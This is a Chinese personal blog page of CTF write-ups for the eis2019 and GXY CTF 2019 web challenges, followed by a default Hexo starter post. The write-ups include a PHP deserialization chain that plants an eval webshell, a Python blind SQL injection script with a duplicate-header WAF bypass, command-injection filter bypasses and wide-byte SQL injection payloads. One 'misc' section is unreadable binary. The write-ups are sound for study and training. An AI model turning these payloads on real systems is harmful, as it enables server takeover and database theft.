        <h1 id="eis2019"><a href="#eis2019" class="headerlink" title="eis2019"></a>eis2019</h1><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="ezupload"><a href="#ezupload" class="headerlink" title="ezupload"></a>ezupload</h3><p>upload:</p>
<p>校验文件头</p>
<p>过滤后缀php</p>
<p>上传php5后缀绕过</p>
<h3 id="ezpop"><a href="#ezpop" class="headerlink" title="ezpop"></a>ezpop</h3><p> <a href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/php-filter-magic.html</a> </p>
<pre><code class="php">&lt;?php
error_reporting(0);

class A{

    protected $store;

    protected $key;

    protected $expire;

    public function __construct($store, $key = &#39;flysystem&#39;, $expire = null)
    {
        $this-&gt;key    = $key;
        $this-&gt;store  = $store;
        $this-&gt;expire = $expire;
    }

    public function cleanContents(array $contents)
    {
        $cachedProperties = array_flip([
            &#39;path&#39;, &#39;dirname&#39;, &#39;basename&#39;, &#39;extension&#39;, &#39;filename&#39;,
            &#39;size&#39;, &#39;mimetype&#39;, &#39;visibility&#39;, &#39;timestamp&#39;, &#39;type&#39;,
        ]);

        foreach ($contents as $path =&gt; $object) {
            if (is_array($object)) {
                $contents[$path] = array_intersect_key($object, $cachedProperties);
            }
        }

        return $contents;
    }

    public function getForStorage()
    {
        $cleaned = $this-&gt;cleanContents($this-&gt;cache);

        return json_encode([$cleaned, $this-&gt;complete]);
    }

    public function save()
    {
        $contents = $this-&gt;getForStorage();

        $this-&gt;store-&gt;set($this-&gt;key, $contents, $this-&gt;expire);
    }

    public function __destruct()
    {
        if (! $this-&gt;autosave) {
            $this-&gt;save();
        }
    }
}

class B{

    protected function getExpireTime($expire): int
    {
        return (int) $expire;
    }

    public function getCacheKey(string $name): string
    {
        return $this-&gt;options[&#39;prefix&#39;] . $name;
    }

    protected function serialize($data): string
    {
        if (is_numeric($data)) {
            return (string) $data;
        }

        $serialize = $this-&gt;options[&#39;serialize&#39;];

        return $serialize($data);
    }

    public function set($name, $value, $expire = null): bool
    {
        $this-&gt;writeTimes++;

        if (is_null($expire)) {
            $expire = $this-&gt;options[&#39;expire&#39;];
        }

        $expire   = $this-&gt;getExpireTime($expire);
        $filename = $this-&gt;getCacheKey($name);

        $dir = dirname($filename);

        if (!is_dir($dir)) {
            try {
                mkdir($dir, 0755, true);
            } catch (\Exception $e) {
                // 创建失败
            }
        }

        $data = $this-&gt;serialize($value);

        if ($this-&gt;options[&#39;data_compress&#39;] &amp;&amp; function_exists(&#39;gzcompress&#39;)) {
            //数据压缩
            $data = gzcompress($data, 3);
        }

        $data   = &quot;&lt;?php\n//&quot; . sprintf(&#39;%012d&#39;, $expire) . &quot;\n exit();?&gt;\n&quot; . $data;
        $result = file_put_contents($filename, $data);

        if ($result) {
            return true;
        }

        return false;
    }

}

if (isset($_GET[&#39;src&#39;]))
{
    highlight_file(__FILE__);
}

$dir = &quot;uploads/&quot;;

if (!is_dir($dir))
{
    mkdir($dir);
}
unserialize($_GET[&quot;data&quot;]);</code></pre>
<p>这里有一个上传点</p>
<pre><code class="php">$data   = &quot;&lt;?php\n//&quot; . sprintf(&#39;%012d&#39;, $expire) . &quot;\n exit();?&gt;\n&quot; . $data;
$result = file_put_contents($filename, $data);</code></pre>
<p>但是这里有个死亡exit</p>
<p> <a href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/php-filter-magic.html</a> </p>
<p>这里文件名可控,我们用php协议编码exit从而绕过死亡exit</p>
<p>构造</p>
<pre><code class="php">&lt;?php

class A{

    protected $store;

    protected $key;

    protected $expire;
    public $autosave=FALSE;
    public $complete;
    public $cache;

    public function __construct()
    {
        $this-&gt;key    = &quot;fffffuck.php&quot;;
        $this-&gt;store=new B;
        $this-&gt;expire = $expire;
        $this-&gt;complete=&quot;PD9waHAgZXZhbCgkX1BPU1RbImEiXSk7ID8+&quot;;
        $this-&gt;cache=array();
    }

}

class B{

    public $options;
    public $writeTimes;
    public function __construct()
    {
        $this-&gt;options=array(
            &#39;expire&#39;=&gt;&#39;0&#39;,
            &quot;prefix&quot;=&gt;&#39;php://filter/write=convert.base64-decode/resource=uploads/&#39;,
            &#39;serialize&#39;=&gt;&#39;serialize&#39;,
            &#39;data_compress&#39;=&gt;FALSE
        );

    }


}
print(urlencode(serialize(new A)));
?&gt;</code></pre>
<h3 id="ezbypass"><a href="#ezbypass" class="headerlink" title="ezbypass"></a>ezbypass</h3><p> <a href="https://github.com/mm0r1/exploits" target="_blank" rel="noopener">https://github.com/mm0r1/exploits</a> </p>
<p>利用这个绕过</p>
<h3 id="ezwaf"><a href="#ezwaf" class="headerlink" title="ezwaf"></a>ezwaf</h3><pre><code class="php">&lt;?php
include &quot;config.php&quot;;

if (isset($_GET[&#39;src&#39;]))
{
    highlight_file(__FILE__);
}

function escape($arr)
{
    global $mysqli;
    $newarr = array();
    foreach($arr as $key=&gt;$val)
    {
        if (!is_array($val))
        {
            $newarr[$key] = mysqli_real_escape_string($mysqli, $val);
        }
    }
    return $newarr;
}

$_GET= escape($_GET);

if (isset($_GET[&#39;name&#39;]))
{
    $name = $_GET[&#39;name&#39;];
    mysqli_query($mysqli, &quot;select age from user where name=&#39;$name&#39;&quot;);
}else if(isset($_GET[&#39;age&#39;]))
{
    $age = $_GET[&#39;age&#39;];
    mysqli_query($mysqli, &quot;select name from user where age=$age&quot;);
}

</code></pre>
<p>选择age作为注入点，不需要逃逸引号,没有回显利用时间盲注</p>
<p><code>?age=1%2bsleep(1)</code> =&gt; 403</p>
<p>apache设置了waf</p>
<p>用畸形的http绕过waf</p>
<pre><code class="python">import requests
import hackhttp 
import urllib
import socket

ip = &#39;111.186.57.61&#39;
port = 10601

def send_raw(raw):

    try:
        with socket.create_connection((ip, port), timeout=2) as conn:
            conn.send(bytes(raw,encoding=&quot;ascii&quot;))
            res = conn.recv(10240).decode()

    except:
        return True

    return False



def rawhttp(sql):
    sql=urllib.parse.quote(sql)
    burp0_url = &quot;http://111.186.57.61:10601/?age={}&quot;.format(sql)
    raw=&#39;&#39;&#39;GET /?age={} HTTP/1.1
Host: 111.186.57.61:10601
Pragma: no-cache
Cache-Control: no-cache
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
Connection: close
Content-Length: 0
Content-Length: 0

&#39;&#39;&#39;.format(sql).replace(&quot;\n&quot;,&quot;\r\n&quot;)
    return send_raw(raw)


l=&#39;0123456789ABCDEF&#39;
result=&quot;657A73716C69&quot;#database :ezsqli

result=&quot;&quot;#table flag_xdd,user?
#column flag_32122
#flag{bypass_modsecurity_a202e614489c}
j=len(result)
while True:
    for i in l:
        sql=&quot;if((select substr(hex(GROUP_CONCAT(flag_32122)),{},1) FROM flag_xdd)=char({}),sleep(10),0)&quot;.format(j+1,ord(i))
        if rawhttp(sql):
            result+=i
            print(result)
            break
        else :
            print(&quot;第{}个字符不是{}&quot;.format(j+1,i))
    j+=1


</code></pre>
<h3 id="ezcms"><a href="#ezcms" class="headerlink" title="ezcms"></a>ezcms</h3><p>莫得</p>
<h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h2><h3 id="two-cat"><a href="#two-cat" class="headerlink" title="two_cat"></a>two_cat</h3><p>看别人的wp知道是盲水印攻击</p>
<h2 id="misc-1"><a href="#misc-1" class="headerlink" title="misc 1"></a>misc 1</h2><pre><code>I¤Ìçz6j|´±¥ó¼¹[ƂĄʃz@ałޢ|ӄɒak@ałޢŅyĉӡk@ałޒ|ӄɒak@֋@JBťɁÉ֕k@ŧÅՄń@Ձ٨@ÖąŀąÉԁԀɕÅكȁՇƀÖąZ@U@SӅǅŀÈYCÅڀĀĢń@֕@ʂՀĉՖęË@ɣ@ŧɢâ@ɕ@c@ӅbĀȀԤäSӨ@ɕÖԗcɂӅ@Ņ٢ɖբk@SԀƅcęɕȀ¤È@ąӉǈâ@b@Ֆ֠ÖգɇĖĢ@Ӆãř@ؤŕÅÀUŀÈƀBՃƀֆ@ŅفԀ¢ĉʀפՃäcɖրÈYCÅ٢@ƁəӨ@ɔז٣UĀƖڀԖąٕ@Öԗģř@ӁՇāǅÀMŧCÓɀƈɃɀÈYCÅ٢@YƀBգ@ŁىŢ@CÖلɕȀÖ@ƈɃɀŅ٢ɖրֆ@ƂĄʃ@ȖŽم@Ӗ֒ɕȀc]K@ʂՀDWÅŀƂĄʃ@ƙ֔@פՃȅŀÁل@Öą@ɕ@ÈƀŁٓɀ񹶰ÀUŀי֔ēǁÅŀɣ@b@ä£֔ř`ÖգٖԀÁãɃ@MƀÖՕŃÖڀÖբ׉فè]k@ęՉՇ@ÈƀSمDɀŢÁɢȅŀ¢ĉʀ£UāلK@㖄hk@ʂՀÓIԢ@Ö@@U@֗ŕ`¨£ŔÀÖԗUɫ@¤ĀʂսÀ֦րąىףɖրֆ@ÈƀƂĄʃ@ŁىUâ@UŀȖǀÖ@ÖեřĀæŅրÈŔ@ɢ@£ɓԀɕÅٕSӨ@ÓbƉń@ÖؠÙţk@¤ٕ`Ɩم`مDɕȋ@ȁÒřÀUÈ@c@ÈƀŅ٨@Ձԅ@ֆ@ƂĄʃ@UŀÖբɄř@ɣ@ԁՉƅ£cɖրֆ@פم£@ťɓKƓG@ɢ@ƓGp°��ƴ����򴄴𰲳ǰƄÅ�</code></pre><p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="https://www.ccreater.top/1970/01/01/eis2019/">https://www.ccreater.top/1970/01/01/eis2019/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://www.ccreater.top/1970/01/01/eis2019/" data-id="ckmn57570005is1nie2mb7dq3" data-title="eis2019" class="article-share-link">Share</a>
      
	  
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>

    </footer>
  </div>
  
</article>





  
    <article id="post-gxyctf2019" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/1970/01/01/gxyctf2019/" class="article-date">
  <time class="dt-published" datetime="1970-01-01T00:00:00.000Z" itemprop="datePublished">1970-01-01</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E6%AF%94%E8%B5%9B/">比赛</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/1970/01/01/gxyctf2019/">gxytf2019</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="gxyctf"><a href="#gxyctf" class="headerlink" title="gxyctf"></a>gxyctf</h1><h2 id="ping-ping-ping"><a href="#ping-ping-ping" class="headerlink" title="ping ping ping"></a>ping ping ping</h2><p>过滤$,’ ‘,</p>
<p>未过滤符号:<code>!,#,$,%,(,.,+,-,:,;,=</code></p>
<p>过滤空格用$IFS来代替</p>
<p>过滤flag</p>
<p>用base64来绕过</p>
<p><code>aasdf||echo$IFS$1ZmxhZy5waHA=|base64$IFS-d|xargs$IFS$IFS``cat</code></p>
<pre><code class="php">    &lt;?php
    if(isset($_GET[&#39;ip&#39;])){
        $ip = $_GET[&#39;ip&#39;];
        if(preg_match(&quot;/\&amp;|\/|\?|\*|\&lt;|[\x{00}-\x{1f}]|\&gt;|\&#39;|\&quot;|\\|\(|\)|\[|\]|\{|\}/&quot;, $ip, $match)){
            echo preg_match(&quot;/\&amp;|\/|\?|\*|\&lt;|[\x{00}-\x{20}]|\&gt;|\&#39;|\&quot;|\\|\(|\)|\[|\]|\{|\}/&quot;, $ip, $match);
            die(&quot;fxck your symbol!&quot;);
        }
        else if(preg_match(&quot;/ /&quot;, $ip)){
            die(&quot;fxck your space!&quot;);
        }
        else if(preg_match(&quot;/bash/&quot;, $ip)){
            die(&quot;fxck your bash!&quot;);
        }
        else if(preg_match(&quot;/.*f.*l.*a.*g.*/&quot;, $ip)){
            die(&quot;fxck your flag!&quot;);
        }
        $a = shell_exec(&quot;ping -c 4 &quot;.$ip);
        echo &quot;&lt;pre&gt;&quot;;
        print_r($a);
    }

    ?&gt;</code></pre>
<p><code>asdf||echo$IFS$1ZmxhZy5waHA=|base64$IFS-d|xargs$IFS$IFS$1cat</code></p>
<h2 id="upload"><a href="#upload" class="headerlink" title="upload"></a>upload</h2><p><strong>没做出来忽略他</strong></p>
<p>上传类型也太露骨了把:检测后缀还是上传类型?</p>
<p>Content-Type: image/jpeg,可以上传了</p>
<p>上传文件后无法访问404</p>
<p>上传文件所在文件夹和session有关</p>
<p>将session置空后报错</p>
<pre><code class="html">&lt;b&gt;Warning&lt;/b&gt;:  session_start(): The session id is too long or contains illegal characters, valid characters are a-z, A-Z, 0-9 and &#39;-,&#39; in &lt;b&gt;/var/www/html/index.php&lt;/b&gt; on line &lt;b&gt;2&lt;/b&gt;&lt;br /&gt;
&lt;br /&gt;
&lt;b&gt;Warning&lt;/b&gt;:  session_start(): Cannot send session cache limiter - headers already sent (output started at /var/www/html/index.php:2) in &lt;b&gt;/var/www/html/index.php&lt;/b&gt; on line &lt;b&gt;2&lt;/b&gt;&lt;br /&gt;</code></pre>
<p>猜测随机生成一个值放到session里面</p>
<p>php版本5.6可以%00截断</p>
<p>后缀不能以ph结尾</p>
<h2 id="Do-you-know-robot"><a href="#Do-you-know-robot" class="headerlink" title="Do you know robot"></a>Do you know robot</h2><blockquote>
<p>PHP 在反序列化 string 时没有严格按照序列化格式 <code>s:x:&quot;x&quot;;</code>进行处理，没有对 <code>&quot;</code>后面的是否存在 <code>;</code> 进行判断，同时增加了对十六进制形式字符串的处理，这样前后处理的不一致让人很费解，同时由于 PHP 手册中对此没有详细的说明，大部分程序员对此处理过程并不了解，这可能导致其在编码过程中出现疏漏，甚至导致严重的安全问题。</p>
</blockquote>
<pre><code class="php">&lt;?php 
class FileReader{
    public $Filename;
    public $start;
    public $max_length;
    function __construct(){
        $this-&gt;Filename = __DIR__ . &quot;/bcm.txt&quot;;
        $this-&gt;start = 12;
        $this-&gt;max_length = 72;
    }

    function __wakeup(){
        $this-&gt;Filename = __DIR__ . &quot;/fake_f1ag.php&quot;;
        $this-&gt;start = 10;
        $this-&gt;max_length = 0;
        echo &quot;&lt;script&gt;alert(1)&lt;/script&gt;&quot;;
    }

    function __destruct(){
        $data = file_get_contents($this-&gt;Filename, 0, NULL, $this-&gt;start, $this-&gt;max_length);
        if(preg_match(&quot;/\{|\}/&quot;, $data)){
            die(&quot;you can&#39;t read flag!&quot;);
        }
        else{
            echo $data;
        }
    }
}

if(isset($_GET[&#39;exp&#39;])){
    if(preg_match(&quot;/.?f.?l.?a.?g.?/i&quot;, $_GET[&#39;exp&#39;])){
        die(&quot;hack!&quot;);
    }
    $exp = $_REQUEST[&#39;exp&#39;];
    $e = unserialize($exp);
    echo $e-&gt;Filename;
}
else{
    $exp = new FileReader();
}


?&gt;</code></pre>
<p>令属性数量与实际数量不同来绕过<code>__wakeup</code></p>
<p>利用16进制绕过flag的限制</p>
<p><code>O:10:&quot;FileReader&quot;:4:{s:8:&quot;Filename&quot;;S:71:&quot;\70\68\70\3a\2f\2f\66\69\6c\74\65\72\2f\72\65\61\64\3d\63\6f\6e\76\65\72\74\2e\62\61\73\65\36\34\2d\65\6e\63\6f\64\65\2f\72\65\73\6f\75\72\63\65\3d\2f\76\61\72\2f\77\77\77\2f\68\74\6d\6c\2f\66\6c\61\67\2e\70\68\70&quot;;s:5:&quot;start&quot;;i:0;s:10:&quot;max_length&quot;;i:10000;}</code></p>
<h3 id="解法二"><a href="#解法二" class="headerlink" title="解法二"></a>解法二</h3><p>正则匹配的四<code>$_GET</code>,而传的参数是<code>$_REQUEST</code>,从而绕过</p>
<h2 id="sql1"><a href="#sql1" class="headerlink" title="sql1"></a>sql1</h2><p>union select 设置自己的密码拿到flag</p>
<h2 id="禁止套娃"><a href="#禁止套娃" class="headerlink" title="禁止套娃"></a>禁止套娃</h2><h3 id="解法一"><a href="#解法一" class="headerlink" title="解法一"></a>解法一</h3><p>和bytectf2019有点类似 <a href="https://blog.zeddyu.info/2019/09/17/bytectf2019/" target="_blank" rel="noopener">https://blog.zeddyu.info/2019/09/17/bytectf2019/</a> </p>
<p><code>var_dump(scandir(chr(time())));</code></p>
<p><code>array(5) { [0]=&gt; string(1) &quot;.&quot; [1]=&gt; string(2) &quot;..&quot; [2]=&gt; string(4) &quot;.git&quot; [3]=&gt; string(8) &quot;flag.php&quot; [4]=&gt; string(9) &quot;index.php&quot; }</code></p>
<p>chr,random_bytes</p>
<p>翻数组相关的函数找到array_rand,但是遗憾的是返回的是键名,如果我们能交换键名和值就可以拿到flag.php了,再找一找发现array_filp</p>
<p>最后的payload</p>
<p><code>var_dump(readfile(array_rand(array_flip(scandir(chr(time()))))));</code></p>
<h3 id="解法二-1"><a href="#解法二-1" class="headerlink" title="解法二"></a>解法二</h3><p><code>readfile(session_id(session_start()))</code></p>
<p>然后<code>PHPSESSID=flag.php</code>读到flag</p>
<h2 id="BabySqliv2-0"><a href="#BabySqliv2-0" class="headerlink" title="BabySqliv2.0"></a>BabySqliv2.0</h2><p>提到中文,宽字节注入绕过引号</p>
<p>过滤select,union,where等</p>
<p><code>a%bf%5c%27+ununionion+seselectlect+1,char(97,100,109,105,110),1%23</code></p>
<p>回显密码</p>
<p><code>a%bf%5c%27+ununionion+seselectlect+1,char(97,100,109,105,110),(SELselectECT+group_concat(schema_name)+FROM+information_schema.schemata)%23</code></p>
<p>数据库:<code>information_schema,web_sqli</code></p>
<p><code>a%bf%5c%27+ununionion+seselectlect+1,char(97,100,109,105,110),(SELselectECT+group_concat(table_name)+FROM+information_schema.tables+WHEwhereRE+TABLE_SCHEMA=database())%23</code></p>
<p>表:<code>f14g,user</code></p>
<p><code>a%bf%5c%27+ununionion+seselectlect+1,char(97,100,109,105,110),(SELselectECT+group_concat(column_name)+FROM+information_schema.columns+WHwhereERE+table_name=char(102,49,52,103))%23</code></p>
<p>列:<code>b80bb7740288fda1f201890375a60c8f,327a6c4304ad5938eaf0efb6cc3e53dc</code></p>
<p>读取flag,但是有长度限制</p>
<p>最后得到抖肩舞+flag</p>
<p>GXY{g0Od_job1im_so_vegetable}</p>
<h2 id="babysqliv3-0"><a href="#babysqliv3-0" class="headerlink" title="babysqliv3.0"></a>babysqliv3.0</h2><p>对phpsession注入报错</p>
<pre><code class="html">&lt;br /&gt;
&lt;b&gt;Warning&lt;/b&gt;:  session_start(): The session id is too long or contains illegal characters, valid characters are a-z, A-Z, 0-9 and &#39;-,&#39; in &lt;b&gt;/var/www/html/search.php&lt;/b&gt; on line &lt;b&gt;2&lt;/b&gt;&lt;br /&gt;
&lt;br /&gt;
&lt;b&gt;Warning&lt;/b&gt;:  session_start(): Cannot send session cache limiter - headers already sent (output started at /var/www/html/search.php:2) in &lt;b&gt;/var/www/html/search.php&lt;/b&gt; on line &lt;b&gt;2&lt;/b&gt;&lt;br /&gt;
&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=uft-8&quot;/&gt;&lt;title&gt;login&lt;/title&gt;&lt;script&gt;alert(&#39;Wrong pass&#39;);location.href=&#39;./index.php&#39;&lt;/script&gt;&lt;br /&gt;
&lt;b&gt;Warning&lt;/b&gt;:  Unknown: The session id is too long or contains illegal characters, valid characters are a-z, A-Z, 0-9 and &#39;-,&#39; in &lt;b&gt;Unknown&lt;/b&gt; on line &lt;b&gt;0&lt;/b&gt;&lt;br /&gt;
&lt;br /&gt;
&lt;b&gt;Warning&lt;/b&gt;:  Unknown: Failed to write session data (files). Please verify that the current setting of session.save_path is correct () in &lt;b&gt;Unknown&lt;/b&gt; on line &lt;b&gt;0&lt;/b&gt;&lt;br /&gt;
</code></pre>
<pre><code>[21:19:28] 200 -   89B  - /home.php
[21:19:29] 200 -  562B  - /index.php
[21:19:35] 200 -  253B  - /upload.php
[21:19:35] 301 -  327B  - /uploads  -&gt;  http://183.129.189.60:10023/uploads/
[21:19:35] 403 -  300B  - /uploads/</code></pre><p>fuzz一下发现没啥好注的</p>
<p>再结合扫到的东东,爆破得到密码password</p>
<p>文件上传没用?上传后没有任何提示</p>
<p>content-type改为jpeg,可以上传但是后缀是.txt</p>
<p>如果能控制后缀就可以文件包含了尝试文件名处%00截断无效</p>
<p>home处有文件包含,但是会再末尾添加.fxxkyou(home.php和upload.php不会)</p>
<p>因为题目环境是5.6,尝试%00截断 [ x ]</p>
<p>这里我发现我对文件上传和文件包含部分的掌握不好,以及思考解决方法时候的思考方式不太行</p>
<p>这里利用伪协议直接读取代码,但是我却偏偏没想到这么基础的东西.回去重新学习一下文件包含和上传</p>
<p>代码审计发现phar反序列化可以命令执行</p>
<p>已被魔改</p>
<p>home.php</p>
<pre><code class="php">&lt;?php
echo &quot;&lt;meta http-equiv=\&quot;Content-Type\&quot; content=\&quot;text/html; charset=utf-8\&quot; /&gt; &lt;title&gt;Home&lt;/title&gt;&quot;;
error_reporting(0);

if(isset($_GET[&#39;file&#39;])){
    if(preg_match(&quot;/.?f.?l.?a.?g.?/i&quot;, $_GET[&#39;file&#39;])){
        die(&quot;hacker!&quot;);
    }
    else{
        if(preg_match(&quot;/home$/i&quot;, $_GET[&#39;file&#39;]) or preg_match(&quot;/upload$/i&quot;, $_GET[&#39;file&#39;])){
            $file = $_GET[&#39;file&#39;].&quot;.php&quot;;
        }
        else{
            $file = $_GET[&#39;file&#39;].&quot;.fxxkyou!&quot;;
        }
        echo &quot;当前引用 &quot;.$file;
        require $file;
    }

}
else{
    die(&quot;no permission!&quot;);
}

?&gt;</code></pre>
<p>upload.php</p>
<pre><code class="php">
&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt; 

&lt;form action=&quot;&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;
    上传
    &lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt;
    &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;提交&quot; /&gt;
&lt;/form&gt;

&lt;?php
class Uploader{
    public $Filename;
    public $cmd;
    public $token;


    function __construct(){
        $sandbox = getcwd().&quot;/uploads/&quot;.md5(&quot;admin&quot;).&quot;/&quot;;
        $ext = &quot;.txt&quot;;
        @mkdir($sandbox, 0777, true);
        if(isset($_GET[&#39;name&#39;]) and !preg_match(&quot;/data:\/\/ | filter:\/\/ | php:\/\/ | \./i&quot;, $_GET[&#39;name&#39;])){
            $this-&gt;Filename = $_GET[&#39;name&#39;];
        }
        else{
            $this-&gt;Filename = $sandbox.&quot;admin&quot;.$ext;
        }

        $this-&gt;cmd = &quot;echo &#39;&lt;br&gt;&lt;br&gt;Master, I want to study rizhan!&lt;br&gt;&lt;br&gt;&#39;;&quot;;
        $this-&gt;token = &quot;admin&quot;;
    }

    function upload($file){
        global $sandbox;
        global $ext;

        if(preg_match(&quot;[^a-z0-9]&quot;, $this-&gt;Filename)){
            $this-&gt;cmd = &quot;die(&#39;illegal filename!&#39;);&quot;;
        }
        else{
            if($file[&#39;size&#39;] &gt; 1024){
                $this-&gt;cmd = &quot;die(&#39;you are too big ( :) )&#39;);&quot;;
            }
            else{
                $this-&gt;cmd = &quot;move_uploaded_file(&#39;&quot;.$file[&#39;tmp_name&#39;].&quot;&#39;, &#39;&quot; . $this-&gt;Filename . &quot;&#39;);&quot;;
            }
        }
    }

    function __toString(){
        global $sandbox;
        global $ext;
        // return $sandbox.$this-&gt;Filename.$ext;
        return $this-&gt;Filename;
    }

    function __destruct(){
        if($this-&gt;token != &quot;admin&quot;){
            $this-&gt;cmd = &quot;die(&#39;check token falied!&#39;);&quot;;
        }
        eval($this-&gt;cmd);
        echo &quot;__destruct&quot;;
    }

}

if(isset($_FILES[&#39;file&#39;])) {
    $uploader = new Uploader();
    $uploader-&gt;upload($_FILES[&quot;file&quot;]);
    if(@file_get_contents($uploader)){
        echo &quot;成功上传&lt;br&gt;&quot;.$uploader.&quot;&lt;br&gt;&quot;;
        echo file_get_contents($uploader);
    }
}

?&gt;
</code></pre>
<h2 id="参考-其他人的wp"><a href="#参考-其他人的wp" class="headerlink" title="参考(其他人的wp)"></a>参考(其他人的wp)</h2><ol>
<li><a href="http://www.qfrost.com/PWN/GXY_CTF/" target="_blank" rel="noopener">http://www.qfrost.com/PWN/GXY_CTF/</a> </li>
</ol>
<p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="https://www.ccreater.top/1970/01/01/gxyctf2019/">https://www.ccreater.top/1970/01/01/gxyctf2019/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://www.ccreater.top/1970/01/01/gxyctf2019/" data-id="ckmn57571005ls1ni65qt8fmu" data-title="gxytf2019" class="article-share-link">Share</a>
      
	  
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wp/" rel="tag">wp</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E7%BA%BF%E4%B8%8A%E8%B5%9B/" rel="tag">线上赛</a></li></ul>

    </footer>
  </div>
  
</article>





  
    <article id="post-hello-world" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/1970/01/01/hello-world/" class="article-date">
  <time class="dt-published" datetime="1970-01-01T00:00:00.000Z" itemprop="datePublished">1970-01-01</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/1970/01/01/hello-world/">hello-world</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h2 id="title-Hello-World"><a href="#title-Hello-World" class="headerlink" title="title: Hello World"></a>title: Hello World</h2><p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p>
<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><pre><code class="bash">$ hexo new &quot;My New Post&quot;</code></pre>
<p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p>
<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><pre><code class="bash">$ hexo server</code></pre>
<p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p>
<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><pre><code class="bash">$ hexo generate</code></pre>
<p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p>
<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><pre><code class="bash">$ hexo deploy</code></pre>
<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html" target="_blank" rel="noopener">Deployment</a></p>
<p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="https://www.ccreater.top/1970/01/01/hello-world/">https://www.ccreater.top/1970/01/01/hello-world/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://www.ccreater.top/1970/01/01/hello-world/" data-id="ckmn57573005ps1ni7ozf3gce" data-title="hello-world" class="article-share-link">Share</a>
      
	  
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%9D%82/" rel="tag">杂</a></li></ul>

    </footer>
  </div>
  
</article>





  
    <article id="post-i春秋2020" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/1970/01/01/i%E6%98%A5%E7%A7%8B2020/" class="article-date">
  <time class="dt-published" datetime="1970-01-01T00:00:00.000Z" itemprop="datePublished">1970-01-01</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E6%AF%94%E8%B5%9B/">比赛</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/1970/01/01/i%E6%98%A5%E7%A7%8B2020/">i春秋2020</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
